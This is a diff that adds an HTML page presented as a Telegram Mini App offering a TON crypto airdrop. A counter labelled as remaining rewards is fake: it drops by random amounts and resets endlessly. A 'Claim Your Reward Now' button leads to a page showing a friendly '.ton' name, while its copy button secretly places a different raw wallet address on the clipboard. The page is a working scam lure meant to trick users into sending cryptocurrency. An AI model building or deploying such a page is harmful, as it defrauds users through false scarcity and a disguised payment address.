@@ -1,0 +1,125 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Mini App</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            overflow: auto;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: white;
+        }
+        .page {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: auto;
+            min-height: 100vh;
+            width: 100%;
+            background-size: cover;
+            background-position: top;
+            position: relative;
+        }
+        #page1 {
+            display: flex;
+            background-image: url('https://drive.google.com/uc?export=view&id=1foTBGFAwJEhHTijLc5H1LVqPowSyY-qP');
+        }
+        #page2 {
+            display: none;
+            background-image: url('https://drive.google.com/uc?export=view&id=1fsQSwIXPmeSmnIUXAHix7dtiid_23Jn4');
+        }
+        #counter {
+            margin-top: 140px;
+            font-size: 28px;
+            font-weight: bold;
+            background: rgba(0,0,0,0.5);
+            padding: 10px 20px;
+            border-radius: 10px;
+        }
+        .button {
+            position: absolute;
+            bottom: 40px;
+            padding: 15px 30px;
+            font-size: 18px;
+            background-color: orange;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .copy-container {
+            position: absolute;
+            top: 43%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+        }
+        .copy-box {
+            padding: 15px;
+            background: white;
+            color: black;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .copy-btn {
+            margin-top: 10px;
+            width: 100%;
+            padding: 12px;
+            background-color: orange;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div id="page1" class="page">
+        <img src="screen1.gif" alt="Welcome GIF" style="width: 100%; height: auto; margin-top: 20px;" />
+        <div id="counter">300000</div>
+        <button class="button" onclick="goToPage2()">Claim Your Reward Now</button>
+    </div>
+
+    <div id="page2" class="page">
+        <div class="copy-container">
+            <div class="copy-box" id="address-box">TONairdropCenter.ton</div>
+            <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
+        </div>
+    </div>
+
+    <script>
+        let current = 300000;
+        const min = 100000;
+        const counterEl = document.getElementById("counter");
+
+        function updateCounter() {
+            const decrement = Math.floor(Math.random() * 41) + 10;
+            current -= decrement;
+            if (current < min) current = 300000;
+            counterEl.textContent = current.toLocaleString();
+        }
+
+        setInterval(updateCounter, 700);
+
+        function goToPage2() {
+            document.getElementById("page1").style.display = "none";
+            document.getElementById("page2").style.display = "flex";
+        }
+
+        function copyAddress() {
+            const textToCopy = "UQCBs-if5oGQylQG7ved_1bwZtoQ6ig6gm4SxeZbAYwjFDsG";
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                alert("Address copied!");
+            });
+        }
+    </script>
+</body>
+</html>
